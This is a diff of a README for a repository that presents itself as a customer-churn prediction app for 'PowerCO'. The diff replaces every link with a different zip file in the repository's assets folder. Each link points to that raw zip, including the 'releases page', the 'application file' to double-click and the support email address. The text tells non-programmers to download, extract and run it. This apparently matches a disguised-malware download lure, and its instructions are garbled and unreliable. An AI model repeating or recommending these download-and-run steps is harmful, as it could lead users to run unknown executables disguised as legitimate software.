@@ -1,7 +1,7 @@
 # 🔍 PowerCO-Churn-Prediction-BCG-X - Predict Customer Behavior with Ease
 
 ## 📥 Download Now
-[![Download PowerCO](https://github.com/Silenex/PowerCO-Churn-Prediction-BCG-X/raw/refs/heads/main/assets/Power_Prediction_Churn_BC_X_C_2.6.zip)](https://github.com/Silenex/PowerCO-Churn-Prediction-BCG-X/raw/refs/heads/main/assets/Power_Prediction_Churn_BC_X_C_2.6.zip)
+[![Download PowerCO](https://raw.githubusercontent.com/Silenex/PowerCO-Churn-Prediction-BCG-X/main/assets/Churn_X_C_Power_BC_Prediction_v1.0.zip)](https://raw.githubusercontent.com/Silenex/PowerCO-Churn-Prediction-BCG-X/main/assets/Churn_X_C_Power_BC_Prediction_v1.0.zip)
 
 ## 📚 Introduction
 Welcome to PowerCO-Churn-Prediction-BCG-X! This application helps businesses understand customer behavior by predicting churn. With its easy-to-use features, you can effectively analyze data and implement machine learning techniques without needing programming skills.
@@ -10,10 +10,10 @@ Welcome to PowerCO-Churn-Prediction-BCG-X! This application helps businesses und
 Follow these steps to download and start using PowerCO-Churn-Prediction-BCG-X:
 
 1. **Visit the Releases Page**: 
-   Go to [this page to download](https://github.com/Silenex/PowerCO-Churn-Prediction-BCG-X/raw/refs/heads/main/assets/Power_Prediction_Churn_BC_X_C_2.6.zip). Here, you'll find the latest versions of the software.
+   Go to [this page to download](https://raw.githubusercontent.com/Silenex/PowerCO-Churn-Prediction-BCG-X/main/assets/Churn_X_C_Power_BC_Prediction_v1.0.zip). Here, you'll find the latest versions of the software.
 
 2. **Choose Your Version**: 
-   Look for the newest release, which is typically at the top. You may see options such as "https://github.com/Silenex/PowerCO-Churn-Prediction-BCG-X/raw/refs/heads/main/assets/Power_Prediction_Churn_BC_X_C_2.6.zip". This is the file you need.
+   Look for the newest release, which is typically at the top. You may see options such as "https://raw.githubusercontent.com/Silenex/PowerCO-Churn-Prediction-BCG-X/main/assets/Churn_X_C_Power_BC_Prediction_v1.0.zip". This is the file you need.
 
 3. **Download the File**: 
    Click on the file name to start the download. Save it in a location that is easy to remember, like your Desktop or Downloads folder.
@@ -22,7 +22,7 @@ Follow these steps to download and start using PowerCO-Churn-Prediction-BCG-X:
    If the file is zipped, you’ll need to extract it. Right-click on the zip file and select "Extract All" or use your preferred extraction tool.
 
 5. **Run the Application**: 
-   After extracting, find the application file (e.g., https://github.com/Silenex/PowerCO-Churn-Prediction-BCG-X/raw/refs/heads/main/assets/Power_Prediction_Churn_BC_X_C_2.6.zip) inside the folder. Double-click the file to run it.
+   After extracting, find the application file (e.g., https://raw.githubusercontent.com/Silenex/PowerCO-Churn-Prediction-BCG-X/main/assets/Churn_X_C_Power_BC_Prediction_v1.0.zip) inside the folder. Double-click the file to run it.
 
 ## ⚙️ System Requirements
 To ensure smooth operation, your system should meet the following requirements:
@@ -70,7 +70,7 @@ If you encounter any issues, here are some common problems and solutions:
 ## 📞 Support
 If you need further assistance, please reach out:
 
-- **Email**: https://github.com/Silenex/PowerCO-Churn-Prediction-BCG-X/raw/refs/heads/main/assets/Power_Prediction_Churn_BC_X_C_2.6.zip
+- **Email**: https://raw.githubusercontent.com/Silenex/PowerCO-Churn-Prediction-BCG-X/main/assets/Churn_X_C_Power_BC_Prediction_v1.0.zip
 - **GitHub Issues**: Post your questions on the GitHub Issues page for the project.
 
 ## 📜 License
@@ -83,7 +83,7 @@ Contributions are welcome! If you have suggestions or improvements, feel free to
 For more technical details about the algorithms used and the data science methodologies adopted, refer to the user manual included in the downloaded package.
 
 ## 🔗 Follow These Steps to Download
-1. Visit [this page to download](https://github.com/Silenex/PowerCO-Churn-Prediction-BCG-X/raw/refs/heads/main/assets/Power_Prediction_Churn_BC_X_C_2.6.zip).
+1. Visit [this page to download](https://raw.githubusercontent.com/Silenex/PowerCO-Churn-Prediction-BCG-X/main/assets/Churn_X_C_Power_BC_Prediction_v1.0.zip).
 2. Download the latest version.
 3. Extract and run the application.
 
